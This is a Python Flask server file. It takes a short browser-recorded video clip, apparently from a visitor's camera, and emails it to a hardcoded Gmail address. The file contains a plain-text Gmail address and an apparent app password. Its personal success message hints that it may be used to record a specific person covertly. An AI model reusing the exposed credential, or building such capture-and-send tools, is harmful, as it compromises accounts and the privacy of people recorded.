from flask import Flask, render_template, request, jsonify
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import base64

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_video', methods=['POST'])
def send_video():
    data = request.get_json()
    video_data = data.get('video')

    if not video_data:
        return jsonify({'error': 'Tidak ada data video'}), 400

    # Pisahkan bagian header dan base64
    header, encoded = video_data.split(',', 1)
    video_bytes = base64.b64decode(encoded)

    # GANTI EMAIL & APP PASSWORD DI SINI
    sender_email = "pyt02400@gmail.com"
    receiver_email = "pyt02400@gmail.com"
    password = "dqkf qzlb lfxl gpoa"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "🎥 Video 5 Detik dari Web"

    # Siapkan lampiran video
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(video_bytes)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="rekaman.webm"')
    msg.attach(part)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, password)
        server.send_message(msg)
        server.quit()
        return jsonify({'message': 'love you Nida cantik'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
